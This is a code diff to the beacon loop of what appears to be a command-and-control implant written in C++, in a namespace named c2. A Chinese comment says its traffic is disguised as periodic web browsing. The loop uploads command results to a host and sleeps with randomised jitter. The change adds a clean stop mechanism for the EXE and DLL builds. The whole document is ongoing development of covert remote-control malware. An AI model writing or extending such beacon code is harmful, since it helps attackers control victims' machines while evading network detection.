@@ -2,6 +2,7 @@
 // 流量收敛为周期性 GET/POST，无长连接；伪装成网页浏览。
 #include "beacon.h"
 
+#include "agent_runtime.h"
 #include "cmd_dispatch.h"
 #include "crypto.h"
 #include "protocol.h"
@@ -277,7 +278,8 @@ void run_beacon(const std::string& host, uint16_t port,
     printf("[beacon] started host=%s:%u sleeptime=%ds cookie=%s\n",
            host.c_str(), port, sleeptime, sid.c_str());
 
-    for (;;) {
+    // 支持停止（EXE/DLL 统一）：stop 时跳出轮询循环
+    while (!agent_stop_requested()) {
         // ① POST 待上传结果
         if (!pending.empty()) {
             std::vector<uint8_t> plain = encode_results(pending);
@@ -336,15 +338,16 @@ void run_beacon(const std::string& host, uint16_t port,
             }
         }
 
-        // ③ sleep(sleeptime ± 20% jitter)
+        // ③ sleep(sleeptime ± 20% jitter)（可被停止唤醒）
         int jitter = sleeptime > 0 ? (sleeptime * 20 + 99) / 100 : 0;  // 20%
         int actual = sleeptime;
         if (sleeptime > 0)
             actual = sleeptime + (rand() % (2 * jitter + 1)) - jitter;
         if (actual < 1)
             actual = 1;
-        Sleep((DWORD)actual * 1000);
+        agent_sleep(actual * 1000);
     }
+    printf("[beacon] stopped\n");
 }
 
 }  // namespace c2
